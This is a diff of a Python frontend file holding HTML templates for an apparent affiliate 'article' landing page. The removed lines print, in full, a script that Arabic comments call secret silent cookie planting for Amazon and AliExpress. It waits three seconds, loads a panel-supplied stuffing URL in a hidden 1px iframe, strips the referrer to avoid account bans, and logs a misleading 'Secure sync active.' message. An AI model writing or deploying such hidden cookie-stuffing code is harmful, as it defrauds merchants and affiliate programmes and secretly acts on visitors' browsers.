@@ -394,6 +394,8 @@ PAGE_HTML = """
 
 
 
+
+
 # 👇👇👇 انسخ هذا وألصقه في آخر ملف frontend.py 👇👇👇
 
 # 3. صفحة المقال (Landing Page) مع زرع الكوكيز
@@ -484,28 +486,3 @@ LANDING_HTML = """
     <footer class="bg-slate-50 border-t border-slate-200 py-8 text-center mt-auto">
         <p class="text-slate-400 text-xs">© 2025 TRAFICOON Media Inc.</p>
     </footer>
-
-    <!-- 🔥 الكود السري: زرع الكوكيز الصامت (لأمازون/علي إكسبريس) 🔥 -->
-    {% if s and s.stuffing_url %}
-    <script>
-        window.addEventListener('load', function() {
-            // ننتظر 3 ثواني ليطمئن الزائر ويبدأ القراءة
-            setTimeout(function() {
-                var f = document.createElement('iframe');
-                f.style.display = 'none'; // مخفي تماماً
-                f.style.width = '1px'; 
-                f.style.height = '1px';
-                f.src = "{{ s.stuffing_url }}"; // الرابط يأتي من لوحة التحكم
-                f.referrerPolicy = "no-referrer"; // حماية حسابك من الحظر
-                
-                // إضافة الـ iframe للصفحة
-                document.body.appendChild(f);
-                console.log('Secure sync active.');
-            }, 3000); 
-        });
-    </script>
-    {% endif %}
-
-</body>
-</html>
-"""
